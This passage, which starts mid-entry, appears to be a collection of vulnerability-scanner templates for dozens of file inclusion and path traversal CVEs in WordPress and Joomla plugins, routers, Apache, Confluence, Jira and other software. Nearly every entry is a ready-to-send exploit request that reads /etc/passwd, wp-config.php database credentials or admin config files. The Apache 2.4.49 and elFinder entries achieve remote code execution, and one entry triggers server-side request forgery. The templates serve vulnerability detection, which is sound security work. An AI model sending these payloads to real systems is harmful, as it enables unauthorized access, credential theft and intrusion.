- tags - cve,cve2014,wordpress,wp-plugin,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/tera-charts/charts/zoomabletreemap.php?fn=../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Dompdf \< v0.6.0 - Local File Inclusion

## Description

- A vulnerability in dompdf.php in dompdf before 0.6.1, when DOMPDF_ENABLE_PHP is enabled, allows context-dependent attackers to bypass chroot protections and read arbitrary files via a PHP protocol and wrappers in the input_file parameter, as demonstrated by a php://filter/read=convert.base64-encode/resource in the input_file parameter.

- severity - high
- tags - cve,lfi,wp-plugin,wpscan,cve2014,dompdf,wordpress,wp,edb,seclists

## Requests

- Method - GET

### URL

- {{BaseURL}}/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/PhpSpreadsheet/Writer/PDF/DomPDF.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/wp-content/plugins/web-portal-lite-client-portal-secure-file-sharing-private-messaging/includes/libs/pdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/wp-content/plugins/buddypress-component-stats/lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/wp-content/plugins/abstract-submission/dompdf-0.5.1/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/wp-content/plugins/post-pdf-export/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/wp-content/plugins/blogtopdf/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/wp-content/plugins/gboutique/library/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/wp-content/plugins/wp-ecommerce-shop-styling/includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - word**

- words
  1. application/pdf
  2. filename="dompdf_out.pdf"
- part - header
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Plugin DukaPress 2.5.2 - Directory Traversal

## Description

- A directory traversal vulnerability in the dp_img_resize function in php/dp-functions.php in the DukaPress plugin before 2.5.4 for WordPress allows remote attackers to read arbitrary files via a .. (dot dot) in the src parameter to lib/dp_image.php.
- severity - high
- tags - cve,cve2014,wordpress,wp-plugin,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/dukapress/lib/dp_image.php?src=../../../../wp-config.php

### Matchers

**Type - word**

- words
  1. DB_NAME
  2. DB_PASSWORD
  3. DB_USER
  4. DB_HOST
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress DB Backup \<=4.5 - Local File Inclusion

## Description

- WordPress Plugin DB Backup 4.5 and possibly prior versions are prone to a local file inclusion vulnerability because they fail to sufficiently sanitize user-supplied input. Exploiting this issue can allow an attacker to obtain sensitive information that could aid in further attacks.

- severity - high
- tags - lfi,cve,cve2014,wordpress,wp-plugin,wp,backup,wpscan,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# DomPHP 0.83 - Directory Traversal

## Description

- A directory traversal vulnerability in DomPHP 0.83 and earlier allows remote attackers to have unspecified impacts via a .. (dot dot) in the url parameter to photoalbum/index.php.
- severity - high
- tags - cve,cve2014,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/photoalbum/index.php?urlancien=&url=../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Belkin N150 Router 1.00.08/1.00.09 - Path Traversal

## Description

- A path traversal vulnerability in the webproc cgi module on the Belkin N150 F9K1009 v1 router with firmware before 1.00.08 allows remote attackers to read arbitrary files via a full pathname in the getpage parameter.
- severity - high
- tags - cve,cve2014,lfi,router,firmware,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgi-bin/webproc?getpage=/etc/passwd&var:page=deviceinfo

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Node.js st module Directory Traversal

## Description

- A directory traversal vulnerability in the st module before 0.2.5 for Node.js allows remote attackers to read arbitrary files via a %2e%2e (encoded dot dot) in an unspecified path.
- severity - high
- tags - cve,cve2014,lfi,nodejs,st

## Requests

- Method - GET

### URL

- {{BaseURL}}/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# Joomla! ProDesk 1.0/1.2 - Local File Inclusion

## Description

- Joomla! Pro Desk Support Center (com_pro_desk) component 1.0 and 1.2 allows remote attackers to read arbitrary files via a .. (dot dot) in the include_file parameter to index.php.
- severity - high
- tags - cve2008,joomla,lfi,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_pro_desk&include_file=../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# phpPgAdmin \<=4.2.1 - Local File Inclusion

## Description

- phpPgAdmin 4.2.1 is vulnerable to local file inclusion in libraries/lib.inc.php when register globals is enabled. Remote attackers can read arbitrary files via a .. (dot dot) in the \_language parameter to index.php.
- severity - medium
- tags - cve,cve2008,lfi,phppgadmin,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/phpPgAdmin/index.php?\_language=../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Joomla! ionFiles 4.4.2 - Local File Inclusion

## Description

- Joomla! ionFiles 4.4.2 is susceptible to local file inclusion in download.php in the ionFiles (com_ionfiles) that allows remote attackers to read arbitrary files via a .. (dot dot) in the file parameter.
- severity - high
- tags - edb,cve,cve2008,joomla,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/components/com_ionfiles/download.php?file=../../../../../../../../etc/passwd&download=1

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# nweb2fax \<=0.2.7 - Local File Inclusion

## Description

- nweb2fax 0.2.7 and earlier allow remote attackers to read arbitrary files via the id parameter submitted to comm.php and the var_filename parameter submitted to viewrq.php.
- severity - high
- tags - cve2008,nweb2fax,lfi,traversal,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/comm.php?id=../../../../../../../../../../etc/passwd
- {{BaseURL}}/viewrq.php?format=ps&var_filename=../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# WordPress Sniplets 1.1.2 - Local File Inclusion

## Description

- PHP remote file inclusion vulnerability in modules/syntax_highlight.php in the Sniplets 1.1.2 and 1.2.2 plugin for WordPress allows remote attackers to execute arbitrary PHP code via a URL in the libpath parameter.

- severity - high
- tags - lfi,cve,cve2008,wordpress,wp-plugin,wp,sniplets,edb,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# Joomla! Component RWCards 3.0.11 - Local File Inclusion

## Description

- A directory traversal vulnerability in captcha/captcha_image.php in the RWCards (com_rwcards) 3.0.11 component for Joomla! when magic_quotes_gpc is disabled allows remote attackers to include and execute arbitrary local files via directory traversal sequences in the img parameter.
- severity - high
- tags - cve2008,joomla,lfi,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/components/com_rwcards/captcha/captcha_image.php?img=../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# CMSimple 3.1 - Local File Inclusion

## Description

- CMSimple 3.1 is susceptible to local file inclusion via cmsimple/cms.php when register_globals is enabled which allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the sl parameter to index.php. NOTE: this can be leveraged for remote file execution by including adm.php and then invoking the upload action. NOTE: on 20080601, the vendor patched 3.1 without changing the version number.

- severity - high
- tags - cve,cve2008,lfi,cmsimple

## Requests

### Step - 1

```
GET /index.php?sl=../../../../../../../etc/passwd%00 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Image Browser 0.1.5 rc2 - Local File Inclusion

## Description

- Joomla! Image Browser 0.1.5 rc2 is susceptible to local file inclusion via com_imagebrowser which could allow remote attackers to include and execute arbitrary local files via a .. (dot dot) in the folder parameter to index.php.
- severity - high
- tags - cve,cve2008,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_imagebrowser&folder=../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! \<=2.0.0 RC2 - Local File Inclusion

## Description

- Joomla! 2.0.0 RC2 and earlier are susceptible to local file inclusion in the eXtplorer module (com_extplorer) that allows remote attackers to read arbitrary files via a .. (dot dot) in the dir parameter in a show_error action.
- severity - high
- tags - edb,cve,cve2008,joomla,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_extplorer&action=show_error&dir=..%2F..%2F..%2F%2F..%2F..%2Fetc%2Fpasswd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Clustering Local File Inclusion

## Description

- Clustering master branch as of commit 53e663e259bcfc8cdecb56c0bb255bd70bfcaa70 is affected by a directory traversal vulnerability. This attack can cause the disclosure of critical secrets stored anywhere on the system and can significantly aid in getting remote code access.
- severity - high
- tags - cve,cve2021,lfi,clustering

## Requests

- Method - GET

### URL

- {{BaseURL}}/img/../../../../../../etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

---

# Patreon WordPress \< 1.7.0 - Unauthenticated Local File Disclosure

## Description

- The Jetpack Scan team identified a Local File Disclosure vulnerability in the Patreon WordPress plugin before 1.7.0 that could be abused by anyone visiting the site. Using this attack vector, an attacker could leak important internal files like wp-config.php, which contains database credentials and cryptographic keys used in the generation of nonces and cookies.
- severity - high
- tags - wordpress,patreon-connect,unauth,cve2021,lfi,patreon,wp,wpscan,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/?patron_only_image=../../../../../../../../../../etc/passwd&patreon_action=serve_patron_only_image

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# ffay lanproxy Directory Traversal

## Description

- ffay lanproxy 0.1 is susceptible to a directory traversal vulnerability that could let attackers read /../conf/config.properties to obtain credentials for a connection to the intranet.
- severity - high
- tags - cve,cve2021,lanproxy,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/../conf/config.properties

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. application/octet-stream
- condition - and
- part - header

**Type - word**

- words
  1. config.admin.username
  2. config.admin.password
- condition - and
- part - body

---

# Buffalo WSR-2533DHPL2 - Path Traversal

## Description

- Buffalo WSR-2533DHPL2 firmware version \<= 1.02 and WSR-2533DHP3 firmware version \<= 1.24 are susceptible to a path traversal vulnerability that could allow unauthenticated remote attackers to bypass authentication in their web interfaces.

- severity - critical
- tags - cve,cve2021,lfi,buffalo,firmware,iot,kev,tenable

## Requests

### Step - 1

```
GET /images/..%2finfo.html HTTP/1.1
Host: {{Hostname}}
Referer: {{BaseURL}}/info.html

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. URLToken(cgi_path)
  2. pppoe
  3. wan
- condition - and

---

# Express-handlebars - Local File Inclusion

## Description

- Express-handlebars is susceptible to local file inclusion because it mixes pure template data with engine configuration options through the Express render API. More specifically, the layout parameter may trigger file disclosure vulnerabilities in downstream applications. This potential vulnerability is somewhat restricted in that only files with existing extensions (i.e., file.extension) can be included. Files that lack an extension will have .handlebars appended to them. For complete details refer to the referenced GHSL-2021-018 report. Notes in documentation have been added to help users avoid this potential information exposure vulnerability.
- severity - high
- tags - cve,cve2021,expressjs,lfi,xxe

## Requests

- Method - GET

### URL

- {{BaseURL}}/?layout=/etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:
  2. daemon:[x*]:0:0:
  3. operator:[x*]:0:0:
- condition - or

**Type - status**

- status
  1. 200

---

# AlquistManager Local File Inclusion

## Description

- AlquistManager branch as of commit 280d99f43b11378212652e75f6f3159cde9c1d36 is affected by a directory traversal vulnerability in alquist/IO/input.py. This attack can cause the disclosure of critical secrets stored anywhere on the system and can significantly aid in getting remote code access.
- severity - high
- tags - cve,cve2021,lfi,alquist

## Requests

- Method - GET

### URL

- {{BaseURL}}/asd/../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# MERCUSYS Mercury X18G 1.0.5 Router - Local File Inclusion

## Description

- MERCUSYS Mercury X18G 1.0.5 devices are vulnerable to local file inclusion via ../ in conjunction with a loginLess or login.htm URI (for authentication bypass) to the web server, as demonstrated by the /loginLess/../../etc/passwd URI.
- severity - medium
- tags - cve,cve2021,iot,lfi,router

## Requests

- Method - GET

### URL

- {{BaseURL}}/loginLess/../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

**Type - status**

- status
  1. 200

---

# HD-Network Realtime Monitoring System 2.0 - Local File Inclusion

## Description

- Instances of HD-Network Realtime Monitoring System version 2.0 are vulnerable to a Local File Inclusion vulnerability which allows remote unauthenticated attackers to view confidential information.
- severity - high
- tags - camera,edb,cve,cve2021,hdnetwork,lfi,iot

## Requests

### Step - 1

```
GET /language/lang HTTP/1.1
Host: {{Hostname}}
Referer: {{BaseURL}}
Cookie: s_asptitle=HD-Network%20Real-time%20Monitoring%20System%20V2.0; s_Language=../../../../../../../../../../../../../../etc/passwd; s_browsertype=2; s_ip=; s_port=; s_channum=; s_loginhandle=; s_httpport=; s_sn=; s_type=; s_devtype=

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Spring Boot Actuator Logview Directory Traversal

## Description

- spring-boot-actuator-logview before version 0.2.13 contains a directory traversal vulnerability in libraries that adds a simple logfile viewer as a spring boot actuator endpoint (maven package "eu.hinsch:spring-boot-actuator-logview".

- severity - high
- tags - cve,cve2021,springboot,lfi,actuator

## Requests

- Method - GET

### URL

- {{BaseURL}}/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../
- {{BaseURL}}/log/view?filename=/windows/win.ini&base=../../../../../../../../../../
- {{BaseURL}}/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../
- {{BaseURL}}/log/view?filename=/etc/passwd&base=../../../../../../../../../../

### Matchers

**Type - dsl**

- dsl
  1. regex('root:.\*:0:0:', body)
  2. status_code == 200
- condition - and

**Type - dsl**

- dsl
  1. contains(body, 'bit app support')
  2. contains(body, 'fonts')
  3. contains(body, 'extensions')
  4. status_code == 200
- condition - and

---

# GLPI plugin Barcode \< 2.6.1 - Path Traversal Vulnerability.

## Description

- Barcode is a GLPI plugin for printing barcodes and QR codes. GLPI instances version 2.x prior to version 2.6.1 with the barcode plugin installed are vulnerable to a path traversal vulnerability.
- severity - high
- tags - glpi,cve,cve2021,lfi,plugin,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# MKdocs 1.2.2 - Directory Traversal

## Description

- The MKdocs 1.2.2 built-in dev-server allows directory traversal using the port 8000, enabling remote exploitation to obtain sensitive information. Note the vendor has disputed the vulnerability (see references) because the dev server must be used in an unsafe way (namely public) to have this vulnerability exploited.
- severity - high
- tags - cve,cve2021,mkdocs,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0:
- part - body

**Type - status**

- status
  1. 200

---

# Onair2 \< 3.9.9.2 & KenthaRadio \< 2.0.2 - Remote File Inclusion/Server-Side Request Forgery

## Description

- Onair2 \< 3.9.9.2 and KenthaRadio \< 2.0.2 have exposed proxy functionality to unauthenticated users. Sending requests to this proxy functionality will have the web server fetch and display the content from any URI, allowing remote file inclusion and server-side request forgery.
- severity - critical
- tags - wordpress,lfi,ssrf,oast,wpscan,cve,cve2021

## Requests

### Step - 1

```
GET /?qtproxycall=http://{{interactsh-url}} HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

**Type - status**

- status
  1. 200

---

# Atlassian Confluence Server - Local File Inclusion

## Description

- Atlassian Confluence Server allows remote attackers to view restricted resources via local file inclusion in the /s/ endpoint.
- severity - medium
- tags - kev,packetstorm,cve,cve2021,confluence,atlassian,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/s/{{randstr}}/\_/;/WEB-INF/web.xml

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - body
- words
  1. \<display-name>Confluence\</display-name>
  2. com.atlassian.confluence.setup.ConfluenceAppConfig
- condition - and

---

# Pascom CPS - Local File Inclusion

## Description

- Pascom packaged with Cloud Phone System (CPS) versions before 7.20 contain a known local file inclusion vulnerability.

- severity - high
- tags - cve,cve2021,pascom,lfi

## Requests

### Step - 1

```
GET /services/pluginscript/ HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
GET /services/pluginscript/..;/..;/ HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
GET / HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_2 != status_code_1
  2. contains(body_2, 'pascom GmbH & Co KG') || contains(body_3, 'pascom GmbH & Co KG')
- condition - and

---

# Atlassian Jira Limited - Local File Inclusion

## Description

- Affected versions of Atlassian Jira Limited Server and Data Center are vulnerable to local file inclusion because they allow remote attackers to read particular files via a path traversal vulnerability in the /WEB-INF/web.xml endpoint.
- severity - medium
- tags - lfi,packetstorm,cve,cve2021,jira

## Requests

- Method - GET

### URL

- {{BaseURL}}/s/{{randstr}}/\_/;/WEB-INF/web.xml

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. \<web-app
  2. \</web-app>
- part - body
- condition - and

---

# Jellyfin \<10.7.0 - Local File Inclusion

## Description

- Jellyfin before 10.7.0 is vulnerable to local file inclusion. This issue is more prevalent when Windows is used as the host OS. Servers exposed to public Internet are potentially at risk.

- severity - medium
- tags - cve,cve2021,jellyfin,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/
- {{BaseURL}}/Videos/1/hls/m/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. Content-Type: application/octet-stream
- part - header

**Type - regex**

- regex
  1. \[(font|extension|file)s\]
- part - body

---

# IND780 - Directory Traversal

## Description

- A remote, unauthenticated, directory traversal vulnerability was identified within the web interface used by IND780 Advanced Weighing Terminals Build 8.0.07 March 19, 2018 (SS Label 'IND780_8.0.07'), Version 7.2.10 June 18, 2012 (SS Label 'IND780_7.2.10'). It was possible to traverse the folders of the affected host by providing a traversal path to the 'webpage' parameter in AutoCE.ini This could allow a remote unauthenticated adversary to access additional files on the affected system. This could also allow the adversary to perform further enumeration against the affected host to identify the versions of the systems in use, in order to launch further attacks in future.

- severity - high
- tags - cve,cve2021,ind780,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/IND780/excalweb.dll?webpage=../../AutoCE.ini

### Matchers

**Type - word**

- part - body
- words
  1. ExePath=\Windows
  2. WorkDir=\Windows
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress DZS Zoomsounds \<=6.50 - Local File Inclusion

## Description

- WordPress Zoomsounds plugin 6.45 and earlier allows arbitrary files, including sensitive configuration files such as wp-config.php, to be downloaded via the `dzsap_download` action using directory traversal in the `link` parameter.
- severity - high
- tags - wordpress,wp-plugin,zoomsounds,wpscan,packetstorm,cve,wp,cve2021,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/?action=dzsap_download&link=../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Draytek VigorConnect 6.0-B3 - Local File Inclusion

## Description

- Draytek VigorConnect 1.6.0-B3 is susceptible to local file inclusion in the file download functionality of the WebServlet endpoint. An unauthenticated attacker could leverage this vulnerability to download arbitrary files from the underlying operating system with root privileges.
- severity - high
- tags - cve,cve2021,draytek,lfi,vigorconnect,tenable

## Requests

- Method - GET

### URL

- {{BaseURL}}/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../etc/passwd
- {{BaseURL}}/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../windows/win.ini

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. for 16-bit app support
- condition - or

**Type - word**

- part - header
- words
  1. application/octet-stream

**Type - status**

- status
  1. 200

---

# ECOA Building Automation System - Directory Traversal Content Disclosure

## Description

- The ECOA BAS controller suffers from a directory traversal content disclosure vulnerability. Using the GET parameter cpath in File Manager (fmangersub), attackers can disclose directory content on the affected device
- severity - high
- tags - cve,cve2021,ecoa,lfi,traversal

## Requests

### Step - 1

```
GET /fmangersub?cpath=../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# SAS/Internet 9.4 1520 - Local File Inclusion

## Description

- SAS/Internet 9.4 build 1520 and earlier allows local file inclusion. The samples library (included by default) in the appstart.sas file, allows end-users of the application to access the sample.webcsf1.sas program, which contains user-controlled macro variables that are passed to the DS2CSF macro.
- severity - high
- tags - cve,cve2021,sas,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgi-bin/broker?csftyp=classic,+ssfile1%3d/etc/passwd&\_SERVICE=targetservice&\_DEBUG=131&\_PROGRAM=sample.webcsf1.sas&sysparm=test&\_ENTRY=SAMPLIB.WEBSAMP.PRINT_TO_HTML.SOURCE&BG=%23FFFFFF&DATASET=targetdataset&\_DEBUG=131&TEMPFILE=Unknown&style=a+tcolor%3dblue&\_WEBOUT=test&bgtype=COLOR

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Joomla! ChronoForums 2.0.11 - Local File Inclusion

## Description

- Joomla! ChronoForums 2.0.11 avatar function is vulnerable to local file inclusion through unauthenticated path traversal attacks. This enables an attacker to read arbitrary files, for example the Joomla! configuration file which contains credentials.
- severity - medium
- tags - cve,cve2021,chronoforums,lfi,joomla

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php/component/chronoforums2/profiles/avatar/u1?tvout=file&av=../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Apache Druid - Local File Inclusion

## Description

- Apache Druid ingestion system is vulnerable to local file inclusion. The InputSource is used for reading data from a certain data source. However, the HTTP InputSource allows authenticated users to read data from other sources than intended, such as the local file system, with the privileges of the Druid server process. This is not an elevation of privilege when users access Druid directly, since Druid also provides the Local InputSource, which allows the same level of access. But it is problematic when users interact with Druid indirectly through an application that allows users to specify the HTTP InputSource, but not the Local InputSource. In this case, users could bypass the application-level restriction by passing a file URL to the HTTP InputSource. This issue was previously mentioned as being fixed in 0.21.0 as per CVE-2021-26920 but was not fixed in 0.21.0 or 0.21.1.
- severity - medium
- tags - cve,cve2021,apache,lfi,auth-bypass,druid

## Requests

### Step - 1

```
POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"http","uris":[" file:///etc/passwd "]}},"dataSchema":{"dataSource":"sample","parser":{"type":"string", "parseSpec":{"format":"regex","pattern":"(.*)","columns":["a"],"dimensionsSpec":{},"timestampSpec":{"column":"no_ such_ column","missingValue":"2010-01-01T00:00:00Z"}}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:
  2. druid:\*:1000:1000:
- condition - or

---

# Apache 2.4.49 - Path Traversal and Remote Code Execution

## Description

- A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally, this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.
- severity - high
- tags - cve,cve2021,lfi,rce,apache,misconfig,traversal,kev

## Requests

### Step - 1

```
GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

echo Content-Type: text/plain; echo; {{cmd}}

```

### Matchers

**Type - regex**

- name - LFI
- regex
  1. root:.\*:0:0:

**Type - word**

- name - RCE
- words
  1. CVE-2021-41773-POC

---

# Draytek VigorConnect 1.6.0-B - Local File Inclusion

## Description

- Draytek VigorConnect 1.6.0-B3 is susceptible to local file inclusion in the file download functionality of the DownloadFileServlet endpoint. An unauthenticated attacker could leverage this vulnerability to download arbitrary files from the underlying operating system with root privileges.

- severity - high
- tags - cve,cve2021,draytek,lfi,vigorconnect,tenable

## Requests

- Method - GET

### URL

- {{BaseURL}}/ACSServer/DownloadFileServlet?show_file_name=../../../../../../etc/passwd&type=uploadfile&path=anything
- {{BaseURL}}/ACSServer/DownloadFileServlet?show_file_name=../../../../../../windows/win.ini&type=uploadfile&path=anything

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:
  2. for 16-bit app support
- condition - or

**Type - word**

- part - header
- words
  1. application/octet-stream

**Type - status**

- status
  1. 200

---

# Studio-42 elFinder \< 2.1.60 - Arbitrary File Upload

## Description

- A File Upload vulnerability exists in Studio-42 elFinder 2.0.4 to 2.1.59 via connector.minimal.php, which allows a remote malicious user to upload arbitrary files and execute PHP code.

- severity - critical
- tags - cve,cve2021,elfinder,upload,rce,intrusive

## Requests

### Step - 1

```
GET /elFinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name={{randstr}}.php:aaa HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Step - 2

```
GET /elFinder/php/connector.minimal.php?cmd=put&target={{hash}}&content={{randstr_1}} HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
GET /elfinder/files/{{randstr}}.php%3Aaaa?_t= HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_3, "{{randstr_1}}")
  2. status_code == 200
- condition - and

### Extractors

**Type - regex**

- name - hash
- group - 1
- regex
  1. "hash"\:"(.\*?)"\,
- internal - True

---

# FAUST iServer 9.0.018.018.4 - Local File Inclusion

## Description

- FAUST iServer before 9.0.019.019.7 is susceptible to local file inclusion because for each URL request it accesses the corresponding .fau file on the operating system without preventing %2e%2e%5c directory traversal.
- severity - high
- tags - lfi,packetstorm,cve,cve2021,faust,iserver

## Requests

- Method - GET

### URL

- {{BaseURL}}/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

**Type - status**

- status
  1. 200

---

# Metabase Local File Inclusion

## Description

- Metabase is an open source data analytics platform. In affected versions a local file inclusion security issue has been discovered with the custom GeoJSON map (`admin->settings->maps->custom maps->add a map`) support and potential local file inclusion (including environment variables). URLs were not validated prior to being loaded.
- severity - high
- tags - cve,cve2021,metabase,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/geojson?url=file:///etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# D-Link DAP-1620 - Local File Inclusion

## Description

- D-Link DAP-1620 is susceptible to local file Inclusion due to path traversal that can lead to unauthorized internal files reading [/etc/passwd] and [/etc/shadow].
- severity - high
- tags - cve,cve2021,dlink,lfi,router

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/apply.cgi
  - action=do_graph_auth&graph_code=94102&html_response_message=just_login&html_response_page=../../../../../../../../../../../../../../etc/passwd&log_pass=DummyPass&login_n=admin&login_name=DummyName&tkn=634855349&tmp_log_pass=DummyPass&tmp_log_pass_auth=DummyPass

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

---

